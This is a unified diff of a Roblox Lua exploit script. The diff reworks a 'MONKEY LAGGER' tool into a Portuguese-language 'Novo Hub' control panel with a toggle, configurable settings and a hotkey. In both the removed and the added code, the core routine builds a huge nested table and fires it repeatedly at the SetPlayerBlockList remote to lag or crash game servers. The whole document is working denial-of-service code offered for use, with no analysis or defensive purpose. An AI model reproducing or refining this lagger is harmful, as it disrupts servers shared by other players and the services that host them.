@@ -1,34 +1,230 @@
--- DEOBF BY PRINCE 
+-- Novo Hub Roblox
 
-local Players = game:GetService("Players")
-local CoreGui = game:GetService("CoreGui")
 local UserInputService = game:GetService("UserInputService")
-local TweenService = game:GetService("TweenService")
-local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local plr = Players.LocalPlayer
+local plrGui = plr:WaitForChild("PlayerGui")
 
-local LocalPlayer = Players.LocalPlayer
-
-local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled
-
-local LAGGER_CONFIG = isMobile and {
-    TableIncrease = 2.5,
-    Tries = 1,
-    LoopWaitTime = 0.15
-} or {
-    TableIncrease = 2.5,
-    Tries = 1,
-    LoopWaitTime = 0.15
+local config = {
+    lagger = {
+        x = 2.5,
+        y = 1,
+        z = 0.15,
+        remoteStuff = "RobloxReplicatedStorage.SetPlayerBlockList"
+    },
+    hotkey = nil
 }
 
-local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"
+local guiElements = {}
+local active = false
 
-local function resolveRemote(path)
-    if not path or path == "" then return nil end
+-- Funções de utilidade
+local function createUIElement(elementType, properties, parent)
+    local element = Instance.new(elementType)
+    for prop, value in pairs(properties) do
+        element[prop] = value
+    end
+    element.Parent = parent
+    return element
+end
+
+-- GUI Principal
+local screenGui = createUIElement("ScreenGui", {Name = "ImprovedRobloxHub", ResetOnSpawn = false}, plrGui)
+
+-- Remover GUIs antigas com o mesmo nome
+for _, kid in pairs(plrGui:GetChildren()) do
+    if kid.Name == "ImprovedRobloxHub" and kid ~= screenGui then
+        kid:Destroy()
+    end
+end
+
+guiElements.mainFrame = createUIElement("Frame", {
+    Name = "MainFrame",
+    Size = UDim2.new(0, 300, 0, 200),
+    Position = UDim2.new(0.5, -150, 0.5, -100),
+    BackgroundColor3 = Color3.fromRGB(30, 30, 30),
+    BackgroundTransparency = 0.1,
+    BorderSizePixel = 0,
+    Active = true,
+    Draggable = true,
+    ClipsDescendants = true
+}, screenGui)
+
+createUIElement("UICorner", {CornerRadius = UDim.new(0, 10)}, guiElements.mainFrame)
+createUIElement("UIStroke", {Color = Color3.fromRGB(0, 0, 0), Thickness = 2, ApplyStrokeMode = Enum.ApplyStrokeMode.Border}, guiElements.mainFrame)
+
+-- Top Bar
+guiElements.topBar = createUIElement("Frame", {
+    Name = "TitleBar",
+    Size = UDim2.new(1, 0, 0, 28),
+    BackgroundTransparency = 1
+}, guiElements.mainFrame)
+
+guiElements.titleText = createUIElement("TextLabel", {
+    Size = UDim2.new(0.6, 0, 1, 0),
+    Position = UDim2.new(0, 10, 0, 0),
+    BackgroundTransparency = 1,
+    Text = "Roblox Hub Aprimorado",
+    TextColor3 = Color3.fromRGB(255, 255, 255),
+    TextSize = 14,
+    Font = Enum.Font.GothamBold,
+    TextXAlignment = Enum.TextXAlignment.Left
+}, guiElements.topBar)
+
+guiElements.statusText = createUIElement("TextLabel", {
+    Size = UDim2.new(0.4, 0, 1, 0),
+    Position = UDim2.new(0.6, 0, 0, 0),
+    BackgroundTransparency = 1,
+    Text = "OFF",
+    TextColor3 = Color3.fromRGB(255, 100, 100),
+    TextSize = 12,
+    Font = Enum.Font.GothamBold,
+    TextXAlignment = Enum.TextXAlignment.Right
+}, guiElements.topBar)
+
+createUIElement("Frame", {
+    Size = UDim2.new(1, -16, 0, 1),
+    Position = UDim2.new(0, 8, 0, 28),
+    BackgroundColor3 = Color3.fromRGB(0, 0, 0),
+    BackgroundTransparency = 0.3,
+    BorderSizePixel = 0
+}, guiElements.mainFrame)
+
+-- Conteúdo do Hub (abas ou seções)
+guiElements.contentFrame = createUIElement("Frame", {
+    Name = "ContentFrame",
+    Size = UDim2.new(1, -16, 1, -40),
+    Position = UDim2.new(0, 8, 0, 36),
+    BackgroundColor3 = Color3.fromRGB(40, 40, 40),
+    BackgroundTransparency = 0.1,
+    BorderSizePixel = 0
+}, guiElements.mainFrame)
+
+createUIElement("UICorner", {CornerRadius = UDim.new(0, 8)}, guiElements.contentFrame)
+
+-- Seção Lagger
+guiElements.laggerSection = createUIElement("Frame", {
+    Name = "LaggerSection",
+    Size = UDim2.new(1, 0, 1, 0),
+    Position = UDim2.new(0, 0, 0, 0),
+    BackgroundColor3 = Color3.fromRGB(50, 50, 50),
+    BackgroundTransparency = 0.1,
+    BorderSizePixel = 0
+}, guiElements.contentFrame)
+
+createUIElement("TextLabel", {
+    Size = UDim2.new(1, 0, 0, 20),
+    Position = UDim2.new(0, 0, 0, 5),
+    BackgroundTransparency = 1,
+    Text = "Configurações do Lagger",
+    TextColor3 = Color3.fromRGB(255, 255, 255),
+    TextSize = 16,
+    Font = Enum.Font.GothamBold,
+    TextXAlignment = Enum.TextXAlignment.Center
+}, guiElements.laggerSection)
+
+-- Botão de Ativar/Desativar Lagger
+guiElements.toggleLaggerBtn = createUIElement("TextButton", {
+    Name = "ToggleLaggerButton",
+    Size = UDim2.new(0.8, 0, 0, 30),
+    Position = UDim2.new(0.1, 0, 0, 30),
+    BackgroundColor3 = Color3.fromRGB(22, 22, 22),
+    BorderSizePixel = 0,
+    AutoButtonColor = false,
+    Text = "Ativar Lagger",
+    TextColor3 = Color3.fromRGB(255, 255, 255),
+    TextSize = 14,
+    Font = Enum.Font.GothamBold
+}, guiElements.laggerSection)
+
+createUIElement("UICorner", {CornerRadius = UDim.new(0, 8)}, guiElements.toggleLaggerBtn)
+createUIElement("UIStroke", {Color = Color3.fromRGB(0, 0, 0), Thickness = 1, ApplyStrokeMode = Enum.ApplyStrokeMode.Border}, guiElements.toggleLaggerBtn)
+
+-- Input fields para cfg.x, cfg.y, cfg.z
+local function createConfigInput(parent, labelText, initialValue, yOffset, configKey)
+    local label = createUIElement("TextLabel", {
+        Size = UDim2.new(0.3, 0, 0, 20),
+        Position = UDim2.new(0.05, 0, 0, yOffset),
+        BackgroundTransparency = 1,
+        Text = labelText,
+        TextColor3 = Color3.fromRGB(255, 255, 255),
+        TextSize = 12,
+        Font = Enum.Font.Gotham
+    }, parent)
+
+    local textBox = createUIElement("TextBox", {
+        Size = UDim2.new(0.6, 0, 0, 20),
+        Position = UDim2.new(0.35, 0, 0, yOffset),
+        BackgroundColor3 = Color3.fromRGB(60, 60, 60),
+        TextColor3 = Color3.fromRGB(255, 255, 255),
+        TextSize = 12,
+        Font = Enum.Font.Gotham,
+        Text = tostring(initialValue),
+        ClearTextOnFocus = false
+    }, parent)
+    createUIElement("UICorner", {CornerRadius = UDim.new(0, 5)}, textBox)
+
+    textBox.FocusLost:Connect(function(enterPressed)
+        local value = tonumber(textBox.Text)
+        if value then
+            config.lagger[configKey] = value
+        else
+            textBox.Text = tostring(config.lagger[configKey]) -- Reverter se o input for inválido
+        end
+    end)
+    return textBox
+end
+
+guiElements.inputX = createConfigInput(guiElements.laggerSection, "X (Incremento):", config.lagger.x, 70, "x")
+guiElements.inputY = createConfigInput(guiElements.laggerSection, "Y (Tentativas):", config.lagger.y, 100, "y")
+guiElements.inputZ = createConfigInput(guiElements.laggerSection, "Z (Intervalo):", config.lagger.z, 130, "z")
+
+-- Seção de Keybind
+guiElements.keybindSection = createUIElement("Frame", {
+    Name = "KeybindSection",
+    Size = UDim2.new(1, 0, 0, 50),
+    Position = UDim2.new(0, 0, 0, 160),
+    BackgroundColor3 = Color3.fromRGB(50, 50, 50),
+    BackgroundTransparency = 0.1,
+    BorderSizePixel = 0
+}, guiElements.contentFrame)
+
+createUIElement("TextLabel", {
+    Size = UDim2.new(0.4, 0, 1, 0),
+    Position = UDim2.new(0.05, 0, 0, 0),
+    BackgroundTransparency = 1,
+    Text = "Hotkey:",
+    TextColor3 = Color3.fromRGB(255, 255, 255),
+    TextSize = 12,
+    Font = Enum.Font.Gotham,
+    TextXAlignment = Enum.TextXAlignment.Left
+}, guiElements.keybindSection)
+
+guiElements.keybindBtn = createUIElement("TextButton", {
+    Name = "KeybindButton",
+    Size = UDim2.new(0.3, 0, 0, 20),
+    Position = UDim2.new(0.45, 0, 0, 15),
+    BackgroundColor3 = Color3.fromRGB(60, 60, 60),
+    BorderSizePixel = 0,
+    AutoButtonColor = false,
+    Text = "?",
+    TextColor3 = Color3.fromRGB(255, 255, 255),
+    TextSize = 12,
+    Font = Enum.Font.GothamBold
+}, guiElements.keybindSection)
+
+createUIElement("UICorner", {CornerRadius = UDim.new(0, 5)}, guiElements.keybindBtn)
+
+-- Funções do Lagger (adaptadas do script original)
+local function getRemote(road)
+    if not road or road == "" then
+        return nil
+    end
     local obj = game
-    local cleaned = path:gsub("^game%.", "")
-    for segment in cleaned:gmatch("[^%.]+") do
+    local clean = road:gsub("^game%.", "")
+    for piece in clean:gmatch("[^%.]+") do
         if obj then
-            obj = obj[segment]
+            obj = obj[piece]
         else
             return nil
         end
@@ -36,292 +232,158 @@ local function resolveRemote(path)
     return obj
 end
 
-local function getmaxvalue(val)
-    local mainvalueifonetable = 499999
-    if type(val) ~= "number" then return nil end
-    return mainvalueifonetable / (val + 2)
-end
+local function doSpam(inc, attempts)
+    local mainTable = {}
+    local spamTable = {}
+    table.insert(spamTable, {})
+    local ptr = spamTable[1]
+    for i = 1, inc do
+        local newTable = {}
+        table.insert(ptr, newTable)
+        ptr = newTable
+    end
+    for i = 1, 15000 do
+        table.insert(mainTable, spamTable)
+        if i % 1000 == 0 then
+            task.wait()
+        end
+    end
 
-local function bomb(tableincrease, tries)
-    local maintable = {}
-    local spammedtable = {}
-    table.insert(spammedtable, {})
-    local z = spammedtable[1]
-    for i = 1, tableincrease do
-        local tableins = {}
-        table.insert(z, tableins)
-        z = tableins
-    end
-    local maximum = getmaxvalue(tableincrease) or 9999999
-    for i = 1, maximum do
-        table.insert(maintable, spammedtable)
-        if i % 5000 == 0 then task.wait() end
-    end
-    local remote = resolveRemote(CUSTOM_REMOTE_PATH)
-    if remote then
-        for i = 1, tries do
+    local remoteObj = getRemote(config.lagger.remoteStuff)
+    if remoteObj then
+        for i = 1, attempts do
             pcall(function()
-                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
-                    remote:FireServer(maintable)
-                elseif remote:IsA("RemoteFunction") then
-                    remote:InvokeServer(maintable)
+                if remoteObj:IsA("RemoteEvent") or remoteObj:IsA("UnreliableRemoteEvent") then
+                    remoteObj:FireServer(mainTable)
+                elseif remoteObj:IsA("RemoteFunction") then
+                    remoteObj:InvokeServer(mainTable)
                 end
             end)
         end
     end
 end
 
-local laggerEnabled = false
-local laggerThread = nil
-
-local function startLaggerLoop()
-    while laggerEnabled do
-        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+local function runLoop()
+    while active do
         task.spawn(function()
-            bomb(LAGGER_CONFIG.TableIncrease, LAGGER_CONFIG.Tries)
+            doSpam(config.lagger.x, config.lagger.y)
         end)
-        task.wait(math.max(LAGGER_CONFIG.LoopWaitTime, 0.15))
+        task.wait(config.lagger.z)
     end
 end
 
-local function stopLaggerLoop()
-    laggerEnabled = false
-    if laggerThread then
-        coroutine.close(laggerThread)
-        laggerThread = nil
-    end
-end
-
-local function startLagger()
-    if laggerThread then return end
-    laggerEnabled = true
-    laggerThread = coroutine.create(startLaggerLoop)
-    coroutine.resume(laggerThread)
-end
-
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "MonkeyLagger"
-ScreenGui.ResetOnSpawn = false
-ScreenGui.Parent = CoreGui
-
-local Frame = Instance.new("Frame")
-Frame.BackgroundTransparency = 0.4
-Frame.Position = UDim2.new(0, 30, 0, 137)
-Frame.ClipsDescendants = true
-Frame.Active = true
-Frame.BackgroundColor3 = Color3.new(0.5, 0, 0)
-Frame.Size = UDim2.new(0, 200, 0, 130)
-Frame.Parent = ScreenGui
-
-local UICorner = Instance.new("UICorner")
-UICorner.CornerRadius = UDim.new(0, 10)
-UICorner.Parent = Frame
-
-local UIStroke = Instance.new("UIStroke")
-UIStroke.Color = Color3.new(0, 0, 0)
-UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-UIStroke.Thickness = 2
-UIStroke.Parent = Frame
-
-local TitleLabel = Instance.new("TextLabel")
-TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
-TitleLabel.Font = Enum.Font.GothamBlack
-TitleLabel.BackgroundTransparency = 1
-TitleLabel.Position = UDim2.new(0, 10, 0, 5)
-TitleLabel.TextColor3 = Color3.new(1, 0.2, 0.2)
-TitleLabel.Text = "MONKEY LAGGER"
-TitleLabel.TextSize = 15
-TitleLabel.Size = UDim2.new(1, -40, 0, 20)
-TitleLabel.Parent = Frame
-
-local SubLabel = Instance.new("TextLabel")
-SubLabel.BackgroundTransparency = 1
-SubLabel.TextXAlignment = Enum.TextXAlignment.Left
-SubLabel.Font = Enum.Font.GothamMedium
-SubLabel.TextTransparency = 0.5
-SubLabel.TextColor3 = Color3.new(1, 0.3, 0.3)
-SubLabel.Text = ""
-SubLabel.Position = UDim2.new(0, 10, 0, 23)
-SubLabel.TextSize = 11
-SubLabel.Size = UDim2.new(1, -40, 0, 15)
-SubLabel.Parent = Frame
-
-local MinimizeBtn = Instance.new("TextButton")
-MinimizeBtn.Font = Enum.Font.GothamBlack
-MinimizeBtn.BackgroundColor3 = Color3.new(0.4, 0, 0)
-MinimizeBtn.Position = UDim2.new(1, -32, 0, 8)
-MinimizeBtn.TextColor3 = Color3.new(1, 0.2, 0.2)
-MinimizeBtn.Text = "-"
-MinimizeBtn.TextSize = 14
-MinimizeBtn.Size = UDim2.new(0, 24, 0, 24)
-MinimizeBtn.Parent = Frame
-
-local MinCorner = Instance.new("UICorner")
-MinCorner.CornerRadius = UDim.new(0, 6)
-MinCorner.Parent = MinimizeBtn
-
-local MinStroke = Instance.new("UIStroke")
-MinStroke.Thickness = 1
-MinStroke.Color = Color3.new(0, 0, 0)
-MinStroke.Parent = MinimizeBtn
-
-local ToggleRow = Instance.new("Frame")
-ToggleRow.Position = UDim2.new(0, 10, 0, 48)
-ToggleRow.BackgroundColor3 = Color3.new(0.4, 0, 0.05)
-ToggleRow.Size = UDim2.new(1, -20, 0, 34)
-ToggleRow.Parent = Frame
-
-local ToggleCorner = Instance.new("UICorner")
-ToggleCorner.Parent = ToggleRow
-
-local ToggleStroke = Instance.new("UIStroke")
-ToggleStroke.Color = Color3.new(0, 0, 0)
-ToggleStroke.Parent = ToggleRow
-
-local ToggleLabel = Instance.new("TextLabel")
-ToggleLabel.BackgroundTransparency = 1
-ToggleLabel.TextXAlignment = Enum.TextXAlignment.Left
-ToggleLabel.TextColor3 = Color3.new(1, 0.3, 0.3)
-ToggleLabel.Font = Enum.Font.GothamMedium
-ToggleLabel.Position = UDim2.new(0, 10, 0, 0)
-ToggleLabel.Text = "Enable Lagger"
-ToggleLabel.TextSize = 13
-ToggleLabel.Size = UDim2.new(1, -60, 1, 0)
-ToggleLabel.Parent = ToggleRow
-
-local SwitchBg = Instance.new("Frame")
-SwitchBg.BackgroundColor3 = Color3.new(0.35, 0, 0.05)
-SwitchBg.Position = UDim2.new(1, -46, 0.5, -9)
-SwitchBg.Size = UDim2.new(0, 36, 0, 18)
-SwitchBg.Parent = ToggleRow
-
-local SwitchBgCorner = Instance.new("UICorner")
-SwitchBgCorner.CornerRadius = UDim.new(0, 9)
-SwitchBgCorner.Parent = SwitchBg
-
-local SwitchKnob = Instance.new("Frame")
-SwitchKnob.BackgroundColor3 = Color3.new(1, 0.2, 0.2)
-SwitchKnob.Position = UDim2.new(0, 2, 0.5, -7)
-SwitchKnob.Size = UDim2.new(0, 14, 0, 14)
-SwitchKnob.Parent = SwitchBg
-
-local SwitchKnobCorner = Instance.new("UICorner")
-SwitchKnobCorner.CornerRadius = UDim.new(0, 7)
-SwitchKnobCorner.Parent = SwitchKnob
-
-local ToggleBtn = Instance.new("TextButton")
-ToggleBtn.Text = ""
-ToggleBtn.BackgroundTransparency = 1
-ToggleBtn.Size = UDim2.new(1, 0, 1, 0)
-ToggleBtn.Parent = ToggleRow
-
-local KeybindRow = Instance.new("Frame")
-KeybindRow.Position = UDim2.new(0, 10, 0, 88)
-KeybindRow.BackgroundColor3 = Color3.new(0.4, 0, 0.05)
-KeybindRow.Size = UDim2.new(1, -20, 0, 34)
-KeybindRow.Parent = Frame
-
-local KeybindCorner = Instance.new("UICorner")
-KeybindCorner.Parent = KeybindRow
-
-local KeybindStroke = Instance.new("UIStroke")
-KeybindStroke.Color = Color3.new(0, 0, 0)
-KeybindStroke.Parent = KeybindRow
-
-local KeybindLabel = Instance.new("TextLabel")
-KeybindLabel.BackgroundTransparency = 1
-KeybindLabel.TextXAlignment = Enum.TextXAlignment.Left
-KeybindLabel.TextColor3 = Color3.new(1, 0.3, 0.3)
-KeybindLabel.Font = Enum.Font.GothamMedium
-KeybindLabel.Position = UDim2.new(0, 10, 0, 0)
-KeybindLabel.Text = "Keybind"
-KeybindLabel.TextSize = 13
-KeybindLabel.Size = UDim2.new(1, -80, 1, 0)
-KeybindLabel.Parent = KeybindRow
-
-local KeybindBtn = Instance.new("TextButton")
-KeybindBtn.Text = "[ -- ]"
-KeybindBtn.AutoButtonColor = false
-KeybindBtn.BackgroundTransparency = 0.3
-KeybindBtn.Position = UDim2.new(1, -68, 0.5, -11)
-KeybindBtn.BackgroundColor3 = Color3.new(0.35, 0, 0.05)
-KeybindBtn.TextColor3 = Color3.new(1, 0.2, 0.2)
-KeybindBtn.Font = Enum.Font.GothamMedium
-KeybindBtn.TextSize = 10
-KeybindBtn.Size = UDim2.new(0, 60, 0, 22)
-KeybindBtn.Parent = KeybindRow
-
-local KeybindBtnCorner = Instance.new("UICorner")
-KeybindBtnCorner.CornerRadius = UDim.new(0, 5)
-KeybindBtnCorner.Parent = KeybindBtn
-
-local dragging, dragStart, startPos
-Frame.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        dragging = true
-        dragStart = input.Position
-        startPos = Frame.Position
-    end
-end)
-UserInputService.InputChanged:Connect(function(input)
-    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-        local delta = input.Position - dragStart
-        Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-    end
-end)
-UserInputService.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        dragging = false
-    end
-end)
-
-local minimized = false
-MinimizeBtn.MouseButton1Click:Connect(function()
-    minimized = not minimized
-    if minimized then
-        Frame.Size = UDim2.new(0, 200, 0, 40)
-        MinimizeBtn.Text = "+"
+local function updateStatusText()
+    if active then
+        guiElements.statusText.Text = "ON"
+        guiElements.statusText.TextColor3 = Color3.fromRGB(100, 255, 100)
+        guiElements.toggleLaggerBtn.Text = "Desativar Lagger"
+        guiElements.toggleLaggerBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
     else
-        Frame.Size = UDim2.new(0, 200, 0, 130)
-        MinimizeBtn.Text = "-"
-    end
-end)
-
-local function setToggle(state)
-    laggerEnabled = state
-    local goal = state and UDim2.new(1, -16, 0.5, -7) or UDim2.new(0, 2, 0.5, -7)
-    local color = state and Color3.new(0.6, 0, 0) or Color3.new(0.35, 0, 0.05)
-    TweenService:Create(SwitchKnob, TweenInfo.new(0.15), {Position = goal}):Play()
-    TweenService:Create(SwitchBg, TweenInfo.new(0.15), {BackgroundColor3 = color}):Play()
-
-    if state then
-        startLagger()
-    else
-        stopLaggerLoop()
+        guiElements.statusText.Text = "OFF"
+        guiElements.statusText.TextColor3 = Color3.fromRGB(255, 100, 100)
+        guiElements.toggleLaggerBtn.Text = "Ativar Lagger"
+        guiElements.toggleLaggerBtn.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
     end
 end
 
-ToggleBtn.MouseButton1Click:Connect(function()
-    setToggle(not laggerEnabled)
-end)
+local function flip(state)
+    active = state
+    updateStatusText()
+    if active then
+        task.spawn(runLoop)
+    end
+end
 
-local boundKey = nil
-local listeningForKey = false
+-- Lógica de Keybind (adaptada do script original)
+local saveLoc = "ImprovedRobloxHub_Keybind.txt"
 
-KeybindBtn.MouseButton1Click:Connect(function()
-    listeningForKey = true
-    KeybindBtn.Text = "[ ... ]"
-end)
-
-UserInputService.InputBegan:Connect(function(input, gpe)
-    if gpe then return end
-    if listeningForKey then
-        if input.UserInputType == Enum.UserInputType.Keyboard then
-            boundKey = input.KeyCode
-            KeybindBtn.Text = "[ " .. tostring(input.KeyCode):sub(14) .. " ]"
-            listeningForKey = false
+local function grabKey()
+    local worked, data = pcall(readfile, saveLoc)
+    if worked and data and data ~= "" then
+        for _, code in pairs(Enum.KeyCode:GetEnumItems()) do
+            if code.Name == data then
+                config.hotkey = code
+                guiElements.keybindBtn.Text = code.Name:sub(1,1)
+                break
+            end
         end
-    elseif boundKey and input.KeyCode == boundKey then
-        setToggle(not laggerEnabled)
+    end
+    if not config.hotkey then
+        guiElements.keybindBtn.Text = "?"
+    end
+end
+
+local function storeKey(key)
+    config.hotkey = key
+    guiElements.keybindBtn.Text = key.Name:sub(1,1)
+    pcall(writefile, saveLoc, key.Name)
+end
+
+grabKey()
+updateStatusText()
+
+-- Conexões de eventos
+guiElements.toggleLaggerBtn.MouseButton1Click:Connect(function()
+    flip(not active)
+end)
+
+local waitingForKeybind = false
+
+guiElements.keybindBtn.MouseButton1Click:Connect(function()
+    waitingForKeybind = true
+    guiElements.keybindBtn.Text = "..."
+end)
+
+UserInputService.InputBegan:Connect(function(input, processedInput)
+    if processedInput then
+        return
+    end
+
+    if input.KeyCode == Enum.KeyCode.LeftControl then
+        guiElements.mainFrame.Visible = not guiElements.mainFrame.Visible
+        return
+    end
+
+    if waitingForKeybind and input.UserInputType == Enum.UserInputType.Keyboard then
+        storeKey(input.KeyCode)
+        waitingForKeybind = false
+    elseif config.hotkey and input.KeyCode == config.hotkey then
+        flip(not active)
+    end
+end)
+
+-- Botão de fechar (opcional, mas bom para um hub)
+local closeBtn = createUIElement("TextButton", {
+    Size = UDim2.new(0, 20, 1, 0),
+    Position = UDim2.new(1, -25, 0, 0),
+    BackgroundTransparency = 1,
+    Text = "X",
+    TextColor3 = Color3.fromRGB(255, 50, 50),
+    TextSize = 16,
+    Font = Enum.Font.GothamBold
+}, guiElements.topBar)
+closeBtn.MouseButton1Click:Connect(function()
+    screenGui:Destroy()
+end)
+
+-- Botão de minimizar (opcional)
+local minimized = false
+local originalSize = guiElements.mainFrame.Size
+local miniBtn = createUIElement("TextButton", {
+    Size = UDim2.new(0, 20, 1, 0),
+    Position = UDim2.new(1, -50, 0, 0),
+    BackgroundTransparency = 1,
+    Text = "_",
+    TextColor3 = Color3.fromRGB(255, 255, 255),
+    TextSize = 16,
+    Font = Enum.Font.GothamBold
+}, guiElements.topBar)
+miniBtn.MouseButton1Click:Connect(function()
+    minimized = not minimized
+    guiElements.contentFrame.Visible = not minimized
+    if minimized then
+        guiElements.mainFrame:TweenSize(UDim2.new(0, originalSize.X.Offset, 0, 28), "Out", "Quad", 0.2, true)
+    else
+        guiElements.mainFrame:TweenSize(originalSize, "Out", "Quad", 0.2, true)
     end
 end)
